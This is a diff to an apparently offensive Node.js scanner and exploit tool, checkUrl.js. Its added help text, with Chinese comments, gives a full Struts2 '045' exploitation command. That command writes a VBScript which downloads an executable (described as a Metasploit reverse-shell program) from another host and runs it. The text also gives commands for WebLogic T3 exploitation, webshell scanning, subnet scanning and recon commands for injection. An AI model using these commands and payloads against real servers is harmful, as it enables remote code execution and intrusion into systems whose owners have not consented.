@@ -1,3 +1,5 @@
+#!/usr/bin/env node
+
 var szMyName = 'M.T.X._2017-06-08 1.0',
 	program     = require('commander'),
 	request = require('request'),
@@ -13,7 +15,7 @@ var szMyName = 'M.T.X._2017-06-08 1.0',
 	g_nPool = 100,
 	iconv = require("iconv-lite"),
 	bRunHost = false,
-	
+
 	g_szUa = "Mozilla/5.0 (Linux; Android 5.1.1; OPPO A33 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043409 Safari/537.36 V1_AND_SQ_7.1.8_718_YYB_D PA QQ/7.1.8.3240 NetType/4G WebP/0.3.0 Pixel/540",
 	g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend",
 	g_szCmdW = "echo whoami: && whoami && echo pwd: && echo %cd% && echo cmdend", // && dir
@@ -34,6 +36,59 @@ var fnError = function(e)
 process.on('uncaughtException', fnError);
 process.on('unhandledRejection', fnError);
 
+var fnHelp = function(){
+/*
+  Usage: checkUrl [options]
+利用struts2 045漏洞，下载metasploit反弹程序并执行，以下在一行中
+node checkUrl.js -u http://192.168.10.115:8080/PortalServer/customize/defaultZh/auth.jsp --struts2 045 --cmd 'del poc.vbs& del mess.exe& @echo Set objXMLHTTP=CreateObject("MSXML2.XMLHTTP")>poc.vbs&@echo objXMLHTTP.open "GET","http://192.168.24.15:8080/Love.exe",false>>poc.vbs&@echo objXMLHTTP.send()>>poc.vbs&@echo If objXMLHTTP.Status=200 Then>>poc.vbs&@echo Set objADOStream=CreateObject("ADODB.Stream")>>poc.vbs&@echo objADOStream.Open>>poc.vbs&@echo objADOStream.Type=1 >>poc.vbs&@echo objADOStream.Write objXMLHTTP.ResponseBody>>poc.vbs&@echo objADOStream.Position=0 >>poc.vbs&@echo objADOStream.SaveToFile "mess.exe">>poc.vbs&@echo objADOStream.Close>>poc.vbs&@echo Set objADOStream=Nothing>>poc.vbs&@echo End if>>poc.vbs&@echo Set objXMLHTTP=Nothing>>poc.vbs&@echo Set objShell=CreateObject("WScript.Shell")>>poc.vbs&@echo objShell.Exec("mess.exe")>>poc.vbs&cscript.exe poc.vbs'
+
+node checkUrl.js -u http://192.168.10.15:8080/PortalServer/customize/defaultZh/auth.jsp --struts2 045 --cmd 'tasklist -svc'
+
+# 批量开放T3检测，txt中可以放url
+node checkUrl.js --t3 checkT3hostsUrlsFile.txt
+# 常见webshell和url扫描
+node checkUrl.js -s ./urls/webshell.txt -m ./urls/ta3menu.txt -u http://192.168.10.115:8080/PortalServer/customize/defaultZh/auth.jsp
+
+# T3协议漏洞的检测和利用
+java -jar jfxl.jar 192.168.19.30:7001
+# 指定一个网段的扫描
+java -jar jfxl.jar 192.168.19.30-255:7001
+# 目录、文件中文本文件字符集批量转换为utf-8
+node gbk2utf8.js fileOrDirName
+
+# eml 文件批量读取、转换
+node emlToFileToos.js /Volumes/MyWork/eml /Volumes/MyWork/eml_data
+
+# 获取jpg等图片中的经纬度信息
+node getFileMetadata.js yourJpgFile.jpg
+
+# jndi内网无密码访问漏洞测试
+java -jar ./JNDI_TEST/JNDITEST.jar
+
+# weblogic中间件T3漏洞扫描
+编辑ip.txt
+python ./weblogic.py
+
+  Options:
+
+    -V, --version           output the version number，版本号信息
+    -u, --url [value]       check url, no default，检查的url，没有默认值
+    -p, --proxy [value]     http proxy,eg: http://127.0.0.1:8080, or https://127.0.0.1:8080, no default，设置代理
+    -t, --t3 [value]        check weblogic t3,default false，对T3协议进行检测，可以指定文件名列表进行检测
+    -i, --install           install node modules,run: npm install
+    -v, --verbose           show logs
+    -w, --struts2 [value]   struts2 type,eg: 045
+    -C, --cmd [value]       cmd type,eg: "ping -c 3 www.baidu.com"
+    -o, --timeout           default 5000
+    -l, --pool              default 100
+    -r, --test              test
+    -m, --menu [value]      scan url + menus, default ./urls/ta3menu.txt
+    -s, --webshell [value]  scan webshell url，设置参数才会运行, default ./urls/webshell.txt
+    -d, --method [value]    default PUT,DELETE,OPTIONS,HEAD,PATCH test
+    -a, --host              host attack test,设置代理后该项功能可能无法使用,default true
+    -k, --keys [value]      scan html keywords, default ./urls/keywords
+*/
+};
 
 program.version(szMyName)
 	.option('-u, --url [value]', 'check url, no default')
@@ -522,6 +577,7 @@ function doStruts2_048(url,fnCbk)
 
 function myLog(a)
 {
+	/*
 	// console.log(String(a.callee))
 	var c = a.callee.caller;
 	// if(c.arguments && c.arguments.caller)console.log(c.arguments.caller)
@@ -531,6 +587,7 @@ function myLog(a)
 		a = a.callee.caller.arguments;
 		if(0 < a.length)myLog(a);
 	}
+	*/
 }
 g_oRst.struts2 || (g_oRst.struts2 = {});
 
@@ -1691,6 +1748,15 @@ if(!program.test && 0 < a.length && g_szUrl)
 		if(/^\d\d\d$/g.test(program.struts2))
 		{
 			eval("doStruts2_" + program.struts2 + "(g_szUrl)");
+			if(program.cmd && "string" == typeof program.cmd)
+			{
+				/*
+				setTimeout(function()
+				{
+					process.exit(0);
+				},20000);
+				*/
+			}
 		}
 	}
 	else
